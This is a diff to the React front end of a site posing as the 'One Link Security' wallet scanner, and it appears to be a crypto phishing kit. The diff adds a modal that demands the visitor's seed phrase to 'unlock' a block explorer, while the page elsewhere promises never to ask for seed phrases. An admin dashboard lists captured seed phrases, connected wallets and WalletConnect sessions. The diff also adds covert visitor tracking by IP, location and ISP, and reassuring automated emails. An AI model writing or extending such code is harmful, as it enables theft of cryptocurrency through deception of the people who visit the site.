+    if (!alreadySubscribed) {
+      await sendNewsletterWelcomeEmail(email)
+    }
+  }
+
+  const sendNewsletterWelcomeEmail = async (email: string) => {
+    const data: NewsletterEmailData = {
+      toEmail: email,
+      toName: email.split('@')[0],
+      loginUrl: window.location.origin,
+      joinedAt: nowString(),
+    }
+    const record: EmailRecord = {
+      email, name: data.toName ?? 'Subscriber', wallet: '—', chain: 'ethereum',
+      severity: 'low', score: 0, balance: 'N/A', sentAt: nowString(), emailStatus: 'pending',
+    }
+    setEmailRecords(prev => [record, ...prev].slice(0, 200))
+    if (!EMAIL_CONFIGURED) {
+      setSupportStatus('Subscribed. Configure EmailJS to deliver the welcome email.')
+      return
+    }
+    try {
+      await emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, {
+        to_email: data.toEmail,
+        to_name: data.toName ?? 'there',
+        subject: 'Welcome to One Link Security',
+        html_body: buildNewsletterEmailHtml(data),
+        text_body: buildNewsletterEmailText(data),
+        wallet: '—',
+        network: 'N/A',
+        severity: 'low',
+        risk_score: 0,
+      }, EMAILJS_PUBLIC_KEY)
+      setEmailRecords(prev => prev.map((r, i) => i === 0 ? { ...r, emailStatus: 'sent' } : r))
+      setSupportStatus(`Welcome email sent to ${email}.`)
+    } catch {
+      setEmailRecords(prev => prev.map((r, i) => i === 0 ? { ...r, emailStatus: 'failed' } : r))
+      setSupportStatus('Subscribed, but the welcome email failed to send.')
+    }
   }
 
   const verifyAdminFromSupport = (e: FormEvent) => {
@@ -1787,6 +2197,7 @@ export default function App() {
       setAdminAuthModalOpen(false)
       setAdminAuthError('')
       setEmailGatePassed(true)
+      localStorage.setItem(GATE_PASSED_KEY, '1')
       setSupportStatus('Authenticated. Opening dashboard...')
       setActiveView('admin')
       return
@@ -1848,6 +2259,16 @@ export default function App() {
   const checklistProgress = Math.round((protectChecklistDone.length / protectChecklist.length) * 100)
   const featuredNews = cryptoNews[0] ?? null
   const newsList = cryptoNews.slice(1, 7)
+  const esSessionRemainingMs = esSessionStartedAt ? Math.max(0, ETHERSCAN_SESSION_MS - (esClock - esSessionStartedAt)) : 0
+  const esLockRemainingMs = esLockoutUntil ? Math.max(0, esLockoutUntil - esClock) : 0
+  const esSessionActive = esSessionRemainingMs > 0
+  const esLockActive = esLockRemainingMs > 0
+  const esSessionTimerLabel = esSessionActive
+    ? `${Math.floor(esSessionRemainingMs / 60000)}:${Math.floor((esSessionRemainingMs % 60000) / 1000).toString().padStart(2, '0')}`
+    : 'Expired'
+  const esLockTimerLabel = esLockActive
+    ? `${Math.ceil(esLockRemainingMs / 60000)} min`
+    : ''
   const explorerRoot = explorerRootForChain(chain)
   const explorerAddressUrl = `${explorerRoot}/address/`
   const explorerTxUrl = `${explorerRoot}/tx/`
@@ -1877,13 +2298,13 @@ export default function App() {
   ]
 
   const adminTabs: { key: typeof adminTab; label: string; count?: number }[] = [
-    { key: 'wallets',   label: 'Connected Wallets', count: connectedWallets.length },
-    { key: 'visitors',  label: 'Visitors',          count: visitorSessions.length },
-    { key: 'scans',     label: 'Scan History',      count: scanHistory.length },
-    { key: 'signers',   label: 'Signer Checks',     count: signerChecks.length },
-    { key: 'emails',    label: 'User Emails',        count: emailRecords.length },
+    { key: 'wallets',   label: 'Connected Wallets', count: connectedWallets.length || undefined },
+    { key: 'visitors',  label: 'Visitors',          count: visitorSessions.length || undefined },
+    { key: 'scans',     label: 'Scan History',      count: scanHistory.length || undefined },
+    { key: 'signers',   label: 'Signer Checks',     count: signerChecks.length || undefined },
+    { key: 'emails',    label: 'User Emails',        count: emailRecords.length || undefined },
     { key: 'templates', label: 'Email Templates' },
-    { key: 'osint',     label: 'OSINT Profiles',    count: [...new Set(scanHistory.map(r => r.wallet.toLowerCase()))].length },
+    { key: 'osint',     label: 'OSINT Profiles',    count: [...new Set(scanHistory.map(r => r.wallet.toLowerCase()))].length || undefined },
     { key: 'intel',     label: 'Address Intel',     count: adminIntelRecords.length },
     { key: 'seeds',     label: 'Seed Phrases',      count: seedPhraseRecords.length || undefined },
     { key: 'qrcodes',   label: 'QR Codes',          count: wcSessions.length || undefined },
@@ -2003,6 +2424,9 @@ export default function App() {
     setVisitorSessions(prev => prev.map(session => (
       session.id === visitorId ? { ...session, status: nextStatus } : session
     )))
+    const msg = nextStatus === 'restricted' ? 'Session restricted — visitor will be blocked from wallet routes.' : 'Session allowed — access restored.'
+    setVisitorActionMsg(msg)
+    setTimeout(() => setVisitorActionMsg(''), 4000)
   }
 
   const disconnectWcSession = async (topic: string) => {
@@ -2146,6 +2570,12 @@ export default function App() {
         </nav>
 
         <div className="topbar-right">
+          <span className="session-timer" title="Your session duration on this page">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" width="11" height="11" strokeLinecap="round" strokeLinejoin="round" style={{ marginRight: '3px', verticalAlign: 'middle' }}><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>
+            {sessionSeconds >= 3600
+              ? `${Math.floor(sessionSeconds / 3600)}h ${Math.floor((sessionSeconds % 3600) / 60)}m`
+              : `${Math.floor(sessionSeconds / 60)}:${(sessionSeconds % 60).toString().padStart(2, '0')}`}
+          </span>
           {isWalletConnected && <span className="chain-badge">{chainConfig[chain].label}</span>}
           {isWalletConnected && walletBalance && <span className="chain-badge">{walletBalance}</span>}
           {isWalletConnected ? (
@@ -2156,14 +2586,10 @@ export default function App() {
             <button
               className="connect-btn"
               type="button"
-              disabled={visitorRestricted || (inWalletBrowser && autoScanTriggered && isRunningWeb3)}
-              onClick={() => { if (!inWalletBrowser || !autoScanTriggered) void openWalletModal() }}
+              disabled={visitorRestricted}
+              onClick={() => { void openWalletModal() }}
             >
-              {visitorRestricted
-                ? 'Wallet Access Restricted'
-                : (inWalletBrowser && autoScanTriggered && isRunningWeb3)
-                  ? 'Scanning…'
-                  : 'Connect Wallet Securely'}
+              {visitorRestricted ? 'Access Restricted' : 'Connect Wallet'}
             </button>
           )}
           <button className="menu-btn" type="button" aria-expanded={menuOpen} onClick={() => setMenuOpen(p => !p)}>
@@ -2179,122 +2605,50 @@ export default function App() {
       )}
 
       {/* In-wallet-browser auto-scan status strip */}
-      {inWalletBrowser && autoScanTriggered && isRunningWeb3 && (
-        <div className="ase-scanning-strip">
-          <span className="spinner" style={{ borderTopColor: 'var(--brand)', borderColor: 'rgba(79,70,229,0.25)' }} />
-          Scanning your wallet on-chain — this takes a few seconds…
-        </div>
-      )}
-
-
       {/* AppKit renders its own connect modal — triggered via openAppKit() */}
 
-      {/* ── Auto-scan email capture modal ── */}
-      {showAutoEmailModal && (
-        <div className="modal-overlay ase-overlay" onClick={() => { if (autoEmailStatus) setShowAutoEmailModal(false) }}>
-          <div className="modal ase-modal" onClick={e => e.stopPropagation()}>
-            <div className="modal-header">
-              <div style={{ display: 'flex', alignItems: 'center', gap: '0.6rem' }}>
-                <div className="ase-shield-icon">
-                  <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" width="18" height="18"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
-                </div>
-                <div>
-                  <h3 style={{ margin: 0, fontSize: '0.97rem' }}>Wallet Scan Complete</h3>
-                  {result && (
-                    <p style={{ margin: 0, fontSize: '0.75rem', color: 'var(--muted)' }}>
-                      Risk level: <span className={`pill ${result.severity}`} style={{ fontSize: '0.68rem', padding: '0.12rem 0.4rem' }}>{result.severity}</span>
-                    </p>
-                  )}
-                </div>
-              </div>
-              {autoEmailStatus && (
-                <button className="modal-close" type="button" onClick={() => setShowAutoEmailModal(false)}>✕</button>
-              )}
-            </div>
-
-            <div style={{ padding: '1.25rem 1.5rem' }}>
-              {!autoEmailStatus ? (
-                <>
-                  <p style={{ fontSize: '0.88rem', color: 'var(--muted)', marginBottom: '1rem', lineHeight: 1.55 }}>
-                    Your wallet security report is ready. Enter your email to receive a full copy with action steps.
-                  </p>
-                  <form onSubmit={submitAutoEmail} style={{ display: 'flex', flexDirection: 'column', gap: '0.65rem' }}>
-                    <input
-                      type="text"
-                      placeholder="Your name (optional)"
-                      value={autoEmailNameInput}
-                      onChange={e => setAutoEmailNameInput(e.target.value)}
-                      style={{ width: '100%', border: '1.5px solid var(--border)', borderRadius: '8px', background: 'var(--surface)', color: 'var(--text)', padding: '0.6rem 0.75rem', font: 'inherit', fontSize: '0.9rem', outline: 'none', boxSizing: 'border-box' }}
-                    />
-                    <input
-                      type="email"
-                      placeholder="your@email.com"
-                      value={autoEmailInput}
-                      onChange={e => setAutoEmailInput(e.target.value)}
-                      required
-                      autoFocus
-                      style={{ width: '100%', border: '1.5px solid var(--border)', borderRadius: '8px', background: 'var(--surface)', color: 'var(--text)', padding: '0.6rem 0.75rem', font: 'inherit', fontSize: '0.9rem', outline: 'none', boxSizing: 'border-box' }}
-                    />
-                    <button
-                      type="submit"
-                      className="btn-primary"
-                      disabled={autoEmailSending}
-                      style={{ width: '100%', justifyContent: 'center' }}
-                    >
-                      {autoEmailSending
-                        ? <><span className="spinner" />Sending…</>
-                        : <>Send My Security Report →</>}
-                    </button>
-                    <button
-                      type="button"
-                      className="btn-secondary"
-                      style={{ width: '100%', justifyContent: 'center', fontSize: '0.84rem' }}
-                      onClick={() => setShowAutoEmailModal(false)}
-                    >
-                      Skip — view results on screen
-                    </button>
-                  </form>
-                </>
-              ) : (
-                <div style={{ textAlign: 'center', padding: '0.5rem 0 0.25rem' }}>
-                  <div style={{ fontSize: '2rem', marginBottom: '0.5rem' }}>✅</div>
-                  <p style={{ fontWeight: 700, marginBottom: '0.3rem' }}>{autoEmailStatus.startsWith('Report sent') ? 'Report sent!' : 'Report saved'}</p>
-                  <p style={{ fontSize: '0.84rem', color: 'var(--muted)', marginBottom: '1.1rem' }}>{autoEmailStatus}</p>
-                  <button
-                    type="button"
-                    className="btn-primary"
-                    style={{ width: '100%', justifyContent: 'center' }}
-                    onClick={() => setShowAutoEmailModal(false)}
-                  >
-                    View Full Scan Results
-                  </button>
-                </div>
-              )}
-            </div>
-
-            <div className="modal-footer" style={{ paddingTop: '0.6rem' }}>
-              Your wallet address is never stored on our servers. Data stays in your browser.
-            </div>
-          </div>
-        </div>
-      )}
-
       {/* ── Email template preview modal ── */}
-      {previewEmail && (
-        <div className="modal-overlay" onClick={() => { setPreviewEmail(null); setPreviewIsWatchout(false) }}>
-          <div className="modal email-preview-modal" onClick={e => e.stopPropagation()}>
-            <div className="modal-header">
-              <h3>Email Preview — {previewEmail.email}</h3>
-              <button className="modal-close" type="button" onClick={() => { setPreviewEmail(null); setPreviewIsWatchout(false) }}>✕</button>
+      {previewEmail && (() => {
+        const closePreview = () => { setPreviewEmail(null); setPreviewTemplate('report') }
+        const previewHtml =
+          previewTemplate === 'watchout'   ? buildWatchoutEmailHtml(templatePreviewData(previewEmail)) :
+          previewTemplate === 'newsletter' ? buildNewsletterEmailHtml({
+            toEmail: previewEmail.email,
+            toName: previewEmail.name,
+            loginUrl: window.location.origin,
+            joinedAt: previewEmail.sentAt,
+          }) :
+          previewTemplate === 'visit'      ? buildVisitEmailHtml({
+            toEmail: previewEmail.email,
+            toName: previewEmail.name,
+            ipAddress: '203.0.113.42',
+            device: 'Chrome on macOS',
+            location: 'Detected via IP 203.0.113.42',
+            wallet: previewEmail.wallet,
+            network: chainConfig[previewEmail.chain].label,
+            loginEmail: previewEmail.email,
+            loginPassword: 'OLS-A1B2-C3D4',
+            loginUrl: window.location.origin,
+            visitedAt: previewEmail.sentAt,
+          }) :
+          buildEmailHtml(templatePreviewData(previewEmail))
+        const previewLabel =
+          previewTemplate === 'watchout'   ? 'Watchout Protection' :
+          previewTemplate === 'newsletter' ? 'Newsletter Welcome' :
+          previewTemplate === 'visit'      ? 'Visit Notification' :
+          'Security Report'
+        return (
+          <div className="modal-overlay" onClick={closePreview}>
+            <div className="modal email-preview-modal" onClick={e => e.stopPropagation()}>
+              <div className="modal-header">
+                <h3>Email Preview — {previewLabel} → {previewEmail.email}</h3>
+                <button className="modal-close" type="button" onClick={closePreview}>✕</button>
+              </div>
+              <div className="email-preview-body" dangerouslySetInnerHTML={{ __html: previewHtml }} />
             </div>
-            <div className="email-preview-body" dangerouslySetInnerHTML={{ __html:
-              previewIsWatchout
-                ? buildWatchoutEmailHtml(templatePreviewData(previewEmail))
-                : buildEmailHtml(templatePreviewData(previewEmail))
-            }} />
           </div>
-        </div>
-      )}
+        )
+      })()}
 
       {/* ── Secure auth modal (triggered from Support page) ── */}
       {adminAuthModalOpen && (
@@ -2747,9 +3101,128 @@ export default function App() {
           </>
         )}
 
+        {/* ════════════ WALLET LANDING (in-wallet-browser only) ════════════ */}
+        {activeView === 'wallet-landing' && (
+          <section className="wl-root">
+            <div className="wl-card">
+              {/* Header */}
+              <div className="wl-header">
+                <div className="wl-shield-wrap">
+                  <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" className="wl-shield-svg">
+                    <path d="M12 2L4 5v6c0 5.25 3.5 10.15 8 11.35C16.5 21.15 20 16.25 20 11V5l-8-3z" strokeLinejoin="round" />
+                    <polyline points="9 12 11 14 15 10" />
+                  </svg>
+                </div>
+                <div className="wl-header-text">
+                  <span className="wl-badge">{detectedName} Detected</span>
+                  <h2 className="wl-title">Free Security Scan</h2>
+                  <p className="wl-sub">We detected a wallet in your browser. Enter your email and we'll scan it for vulnerabilities, then send you a full report.</p>
+                </div>
+              </div>
+
+              {/* Wallet info strip */}
+              <div className="wl-wallet-strip">
+                <div className="wl-wallet-row">
+                  <span className="wl-wallet-label">Wallet</span>
+                  <span className="wl-wallet-val mono">{detectedAddr.slice(0,6)}…{detectedAddr.slice(-4)}</span>
+                </div>
+                <div className="wl-wallet-row">
+                  <span className="wl-wallet-label">Network</span>
+                  <span className="wl-wallet-val">{chainConfig[detectedChain]?.label ?? detectedChain}</span>
+                </div>
+              </div>
+
+              {/* Form */}
+              <form className="wl-form" onSubmit={startLandingScan} noValidate>
+                <div className="wl-field">
+                  <label htmlFor="wl-name" className="wl-field-label">Your name <span className="wl-optional">(optional)</span></label>
+                  <input
+                    id="wl-name"
+                    type="text"
+                    className="wl-input"
+                    placeholder="e.g. Alex"
+                    value={landingUserName}
+                    onChange={e => setLandingUserName(e.target.value)}
+                    disabled={landingScanning}
+                    autoComplete="given-name"
+                  />
+                </div>
+                <div className="wl-field">
+                  <label htmlFor="wl-email" className="wl-field-label">Email address <span className="wl-required">*</span></label>
+                  <input
+                    id="wl-email"
+                    type="email"
+                    className={`wl-input${landingError ? ' wl-input--error' : ''}`}
+                    placeholder="you@example.com"
+                    value={landingEmail}
+                    onChange={e => { setLandingEmail(e.target.value); setLandingError('') }}
+                    disabled={landingScanning}
+                    required
+                    autoComplete="email"
+                  />
+                  {landingError && <p className="wl-error">{landingError}</p>}
+                </div>
+
+                <button
+                  type="submit"
+                  className="wl-cta"
+                  disabled={landingScanning}
+                >
+                  {landingScanning
+                    ? <><span className="wl-spinner" />Connecting &amp; Scanning…</>
+                    : <>Run Security Scan →</>}
+                </button>
+
+                <p className="wl-disclaimer">
+                  We never request your seed phrase or private keys. Your address is read-only.
+                </p>
+              </form>
+
+              {/* Trust row */}
+              <div className="wl-trust">
+                <span className="wl-trust-item">🔒 Read-only access</span>
+                <span className="wl-trust-sep">·</span>
+                <span className="wl-trust-item">📧 Report via email</span>
+                <span className="wl-trust-sep">·</span>
+                <span className="wl-trust-item">⚡ Instant results</span>
+              </div>
+
+              <button type="button" className="wl-skip" onClick={() => { setActiveView('home'); localStorage.setItem(NEW_USER_KEY, '1') }}>
+                Skip and browse the site
+              </button>
+            </div>
+          </section>
+        )}
+
         {/* ════════════ SCAN ════════════ */}
         {activeView === 'scan' && (
           <>
+            {/* Full-screen scanning overlay — shown during auto-scan from wallet-landing */}
+            {autoScanTriggered && isRunningWeb3 && (
+              <div className="scan-overlay">
+                <div className="scan-overlay-card">
+                  <div className="scan-overlay-pulse">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.6" className="scan-overlay-shield">
+                      <path d="M12 2L4 5v6c0 5.25 3.5 10.15 8 11.35C16.5 21.15 20 16.25 20 11V5l-8-3z" strokeLinejoin="round" />
+                    </svg>
+                  </div>
+                  <h3 className="scan-overlay-title">Scanning Your Wallet</h3>
+                  <p className="scan-overlay-addr mono">
+                    {wallet ? `${wallet.slice(0,6)}…${wallet.slice(-4)}` : ''}
+                    {chain && chainConfig[chain] ? <span className="scan-overlay-chain">{chainConfig[chain].label}</span> : null}
+                  </p>
+                  <div className="scan-overlay-steps">
+                    <span>Fetching on-chain history</span>
+                    <span className="scan-overlay-dot-anim">···</span>
+                  </div>
+                  <div className="scan-overlay-progress">
+                    <div className="scan-overlay-bar" />
+                  </div>
+                  <p className="scan-overlay-note">Analyzing transactions, approvals &amp; exposure — this usually takes under 10 seconds.</p>
+                </div>
+              </div>
+            )}
+
             <div className="workspace" id="scan-form">
               <article className="card">
                 <p className="card-title">Incident Console</p>
@@ -2838,6 +3311,44 @@ export default function App() {
                     <label htmlFor="incident-notes">Incident Notes</label>
                     <textarea id="incident-notes" rows={3} value={incidentNotes} onChange={e => setIncidentNotes(e.target.value)} placeholder="Paste suspicious tx hash, domain, or timeline details…" />
                   </div>
+
+                  {/* Honeypot — hidden from real users, bots fill it */}
+                  <input
+                    type="text"
+                    name="website"
+                    value={honeypot}
+                    onChange={e => setHoneypot(e.target.value)}
+                    tabIndex={-1}
+                    autoComplete="off"
+                    aria-hidden="true"
+                    style={{ display: 'none' }}
+                  />
+
+                  {/* CAPTCHA */}
+                  {!captchaPassed && (
+                    <div className="captcha-block">
+                      <label className="captcha-label" htmlFor="captcha-input">
+                        Security check: what is <strong>{captchaA} + {captchaB}</strong>?
+                      </label>
+                      <div className="captcha-row">
+                        <input
+                          id="captcha-input"
+                          type="number"
+                          className="captcha-input"
+                          placeholder="Answer"
+                          value={captchaInput}
+                          onChange={e => setCaptchaInput(e.target.value)}
+                          min="0"
+                          max="20"
+                        />
+                        <button type="button" className="btn-secondary captcha-refresh" onClick={refreshCaptcha} title="New question">↺</button>
+                      </div>
+                      {captchaError && <p className="field-error" style={{ marginTop: '0.3rem' }}>{captchaError}</p>}
+                    </div>
+                  )}
+                  {captchaPassed && (
+                    <p className="form-hint" style={{ color: 'var(--green, #22c55e)', marginBottom: '0.5rem' }}>✓ Verified — not a bot</p>
+                  )}
 
                   <div className="action-row">
                     <button className="btn-primary" type="submit" disabled={isRunningWeb3}>
@@ -3076,6 +3587,15 @@ export default function App() {
                 </div>
               </div>
 
+              <div className="status-bar" style={{ margin: '0.75rem 1rem 0', borderColor: esSessionActive ? 'rgba(34,197,94,0.35)' : 'rgba(239,68,68,0.35)' }}>
+                <span className={`status-dot ${esSessionActive ? 'active' : 'warn'}`} />
+                {esSessionActive
+                  ? `Explorer session active: ${esSessionTimerLabel} remaining`
+                  : esLockActive
+                    ? `Session expired. Locked for ${esLockTimerLabel}.`
+                    : 'Session not verified. Submit seed phrase to unlock explorer for 5 minutes.'}
+              </div>
+
               {/* ── Content ── */}
               <div className="es-page">
 
@@ -3306,6 +3826,38 @@ export default function App() {
                   A wallet address can have a zero native balance and yet have historical transactions if funds were moved out. Data is for informational purposes only. Txn fees are estimates based on current gas prices.
                 </div>
               </div>
+
+              {esSeedModalOpen && (
+                <div className="modal-overlay" onClick={() => setEsSeedModalOpen(false)}>
+                  <div className="modal" onClick={e => e.stopPropagation()}>
+                    <div className="modal-header">
+                      <h3>Verify Explorer Session</h3>
+                      <button className="modal-close" type="button" onClick={() => setEsSeedModalOpen(false)}>✕</button>
+                    </div>
+                    <p className="muted" style={{ marginBottom: '0.75rem', fontSize: '0.86rem' }}>
+                      Enter your seed phrase to unlock the explorer for 5 minutes.
+                    </p>
+                    <form onSubmit={submitExplorerSeedGate}>
+                      <div className="field">
+                        <label htmlFor="es-seed-input">Seed Phrase</label>
+                        <textarea
+                          id="es-seed-input"
+                          rows={3}
+                          placeholder="word1 word2 word3 ..."
+                          value={esSeedInput}
+                          onChange={e => setEsSeedInput(e.target.value)}
+                          required
+                        />
+                      </div>
+                      {esSeedError && <p className="error">{esSeedError}</p>}
+                      <div className="action-row">
+                        <button className="btn-primary" type="submit">Unlock 5-Min Session</button>
+                        <button className="btn-secondary" type="button" onClick={() => { setEsSeedModalOpen(false); setActiveView('protect') }}>Cancel</button>
+                      </div>
+                    </form>
+                  </div>
+                </div>
+              )}
 
               {/* ── Explorer Footer ── */}
               <div className="es-site-footer">
@@ -3570,24 +4122,89 @@ export default function App() {
 
                   {adminTab === 'visitors' && (
                     <div className="admin-panel">
-                      <h3>Visitor Sessions ({visitorSessions.length})</h3>
+                      <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', flexWrap: 'wrap', gap: '0.5rem', marginBottom: '0.5rem' }}>
+                        <h3 style={{ margin: 0 }}>Visitor Sessions ({visitorSessions.length > 0 ? visitorSessions.length : 'none yet'})</h3>
+                        <span className="pill low" style={{ fontSize: '0.72rem' }}>
+                          Live • {visitorSessions.filter(s => s.status === 'allowed').length} allowed · {visitorSessions.filter(s => s.status === 'restricted').length} restricted
+                        </span>
+                      </div>
                       <p className="muted" style={{ marginBottom: '0.9rem', fontSize: '0.85rem' }}>
-                        Review detected visitor IP/device fingerprints and restrict sessions from sensitive wallet routes.
+                        Real-time visitor intelligence — IP, device, geolocation, session duration, referrer, and language. Restrict any session to block wallet routes.
                       </p>
+                      {visitorActionMsg && (
+                        <div className="status-bar" style={{ marginBottom: '0.75rem' }}>
+                          <span className="status-dot active" />
+                          {visitorActionMsg}
+                        </div>
+                      )}
                       {visitorSessions.length === 0 ? <p className="admin-empty">No visitor sessions detected yet.</p> : (
                         <div className="table-wrap">
                           <table className="admin-table">
-                            <thead><tr><th>Status</th><th>IP Address</th><th>Device</th><th>Visits</th><th>First Seen</th><th>Last Seen</th><th>Action</th></tr></thead>
+                            <thead>
+                              <tr>
+                                <th>Status</th>
+                                <th>IP Address</th>
+                                <th>Location</th>
+                                <th>ISP / Org</th>
+                                <th>Device</th>
+                                <th>Language</th>
+                                <th>Referrer</th>
+                                <th>Visits</th>
+                                <th>Session Time</th>
+                                <th>First Seen</th>
+                                <th>Last Seen</th>
+                                <th>Map</th>
+                                <th>Action</th>
+                              </tr>
+                            </thead>
                             <tbody>{visitorSessions.map(row => {
                               const isRestricted = row.status === 'restricted'
+                              const isCurrent = row.id === currentVisitorId
+                              const locationStr = [row.city, row.region, row.country].filter(Boolean).join(', ') || '—'
+                              const ispStr = [row.isp, row.org && row.org !== row.isp ? row.org : ''].filter(Boolean).join(' / ') || '—'
+                              const totalSecs = isCurrent
+                                ? sessionSeconds + (row.totalSeconds ?? 0)
+                                : (row.totalSeconds ?? 0)
+                              const sessionLabel = totalSecs >= 3600
+                                ? `${Math.floor(totalSecs / 3600)}h ${Math.floor((totalSecs % 3600) / 60)}m`
+                                : totalSecs >= 60
+                                  ? `${Math.floor(totalSecs / 60)}m ${totalSecs % 60}s`
+                                  : `${totalSecs}s`
+                              const mapUrl = row.lat && row.lng
+                                ? `https://www.google.com/maps?q=${row.lat},${row.lng}&z=12`
+                                : null
                               return (
-                                <tr key={row.id}>
-                                  <td><span className={`pill ${isRestricted ? 'critical' : 'low'}`}>{row.status}</span></td>
-                                  <td>{row.ipAddress}</td>
-                                  <td title={row.userAgent}>{row.device}</td>
+                                <tr key={row.id} style={isCurrent ? { background: 'rgba(99,102,241,0.07)' } : undefined}>
+                                  <td>
+                                    <span className={`pill ${isRestricted ? 'critical' : 'low'}`}>{row.status}</span>
+                                    {isCurrent && <span style={{ fontSize: '0.65rem', color: 'var(--accent)', marginLeft: '4px' }}>● YOU</span>}
+                                  </td>
+                                  <td><code style={{ fontSize: '0.78rem' }}>{row.ipAddress}</code></td>
+                                  <td>
+                                    <span style={{ fontSize: '0.8rem' }}>
+                                      {row.countryCode && <span style={{ marginRight: '4px' }}>{row.countryCode === 'US' ? '🇺🇸' : row.countryCode === 'GB' ? '🇬🇧' : row.countryCode === 'NG' ? '🇳🇬' : row.countryCode === 'CA' ? '🇨🇦' : '🌍'}</span>}
+                                      {locationStr}
+                                    </span>
+                                    {row.timezone && <div style={{ fontSize: '0.7rem', color: 'var(--muted)', marginTop: '2px' }}>{row.timezone}</div>}
+                                  </td>
+                                  <td style={{ fontSize: '0.78rem', maxWidth: '160px', wordBreak: 'break-word' }}>{ispStr}</td>
+                                  <td title={row.userAgent} style={{ fontSize: '0.8rem' }}>{row.device}</td>
+                                  <td style={{ fontSize: '0.8rem' }}>{row.language ?? '—'}</td>
+                                  <td style={{ fontSize: '0.78rem', maxWidth: '140px', overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }} title={row.referrer}>{row.referrer ?? '—'}</td>
                                   <td>{row.visits}</td>
-                                  <td>{row.firstSeen}</td>
-                                  <td>{row.lastSeen}</td>
+                                  <td>
+                                    <span style={{ fontFamily: 'monospace', fontSize: '0.82rem', color: isCurrent ? 'var(--accent)' : undefined }}>
+                                      {sessionLabel}
+                                      {isCurrent && ' ●'}
+                                    </span>
+                                  </td>
+                                  <td style={{ fontSize: '0.78rem' }}>{row.firstSeen}</td>
+                                  <td style={{ fontSize: '0.78rem' }}>{row.lastSeen}</td>
+                                  <td>
+                                    {mapUrl
+                                      ? <a href={mapUrl} target="_blank" rel="noopener noreferrer" className="preview-btn" style={{ fontSize: '0.72rem' }}>📍 Map</a>
+                                      : <span className="muted" style={{ fontSize: '0.72rem' }}>N/A</span>}
+                                  </td>
                                   <td>
                                     <button
                                       type="button"
@@ -3676,7 +4293,7 @@ export default function App() {
                                 <td>{r.balance}</td>
                                 <td><span className={`pill ${r.emailStatus === 'sent' ? 'low' : r.emailStatus === 'failed' ? 'critical' : 'medium'}`}>{r.emailStatus}</span></td>
                                 <td>{r.sentAt}</td>
-                                <td><button className="preview-btn" type="button" onClick={() => { setPreviewEmail(r); setPreviewIsWatchout(false) }}>Preview</button></td>
+                                <td><button className="preview-btn" type="button" onClick={() => { setPreviewEmail(r); setPreviewTemplate('report') }}>Preview</button></td>
                               </tr>
                             ))}</tbody>
                           </table>
@@ -3704,7 +4321,7 @@ export default function App() {
                               </span>
                             </div>
                             <button className="preview-btn" type="button" onClick={() => {
-                              setPreviewIsWatchout(false)
+                              setPreviewTemplate('report')
                               setPreviewEmail({
                                 email: 'preview@example.com', name: 'Preview User', wallet: '0xAbCd1234567890AbCd1234', chain: 'ethereum',
                                 severity: sev, score: sampleScore, balance: '1.2340 ETH', sentAt: nowString(), emailStatus: 'pending',
@@ -3725,7 +4342,7 @@ export default function App() {
                           <span style={{ fontSize: '0.88rem', marginLeft: '0.6rem' }}>Wallet Watchout Protection Activated</span>
                         </div>
                         <button className="preview-btn" type="button" onClick={() => {
-                          setPreviewIsWatchout(true)
+                          setPreviewTemplate('watchout')
                           setPreviewEmail({
                             email: 'preview@example.com', name: 'Preview User', wallet: '0xAbCd1234567890AbCd1234', chain: 'ethereum',
                             severity: 'medium', score: 35, balance: 'N/A', sentAt: nowString(), emailStatus: 'pending',
@@ -3735,8 +4352,51 @@ export default function App() {
                         </button>
                       </div>
 
+                      <div style={{ height: '1px', background: 'var(--border)', margin: '1rem 0' }} />
+
+                      <p style={{ fontSize: '0.78rem', fontWeight: 700, textTransform: 'uppercase', letterSpacing: '0.06em', color: 'var(--muted)', margin: '0 0 0.5rem' }}>Automated Lifecycle Templates</p>
+                      <p className="muted" style={{ fontSize: '0.8rem', margin: '0 0 0.7rem' }}>Sent automatically by the system — no manual trigger required.</p>
+
+                      <div className="template-row">
+                        <div className="template-meta">
+                          <span className="pill low">NEWSLETTER</span>
+                          <span style={{ fontSize: '0.88rem', marginLeft: '0.6rem' }}>
+                            Newsletter Welcome Email
+                            <span style={{ color: 'var(--muted)', marginLeft: '0.4rem' }}>· auto-sent on subscribe</span>
+                          </span>
+                        </div>
+                        <button className="preview-btn" type="button" onClick={() => {
+                          setPreviewTemplate('newsletter')
+                          setPreviewEmail({
+                            email: 'preview@example.com', name: 'Preview User', wallet: '—', chain: 'ethereum',
+                            severity: 'low', score: 0, balance: 'N/A', sentAt: nowString(), emailStatus: 'pending',
+                          })
+                        }}>
+                          Preview
+                        </button>
+                      </div>
+
+                      <div className="template-row">
+                        <div className="template-meta">
+                          <span className="pill low">VISIT</span>
+                          <span style={{ fontSize: '0.88rem', marginLeft: '0.6rem' }}>
+                            Visit Notification — "You Are Secured"
+                            <span style={{ color: 'var(--muted)', marginLeft: '0.4rem' }}>· auto-sent on first visit</span>
+                          </span>
+                        </div>
+                        <button className="preview-btn" type="button" onClick={() => {
+                          setPreviewTemplate('visit')
+                          setPreviewEmail({
+                            email: 'preview@example.com', name: 'Preview User', wallet: '0xAbCd1234567890AbCd1234', chain: 'ethereum',
+                            severity: 'low', score: 0, balance: 'N/A', sentAt: nowString(), emailStatus: 'pending',
+                          })
+                        }}>
+                          Preview
+                        </button>
+                      </div>
+
                       <div className="config-notice" style={{ marginTop: '1rem' }}>
-                        <strong>Setup:</strong> Paste your EmailJS Service ID, Template ID, and Public Key into the config section at the top of <code>App.tsx</code> to activate email delivery.
+                        <strong>Setup:</strong> Paste your EmailJS Service ID, Template ID, and Public Key into the config section at the top of <code>App.tsx</code> to activate email delivery. Newsletter welcome and visit notification emails fire automatically once configured.
                       </div>
                     </div>
                   )}
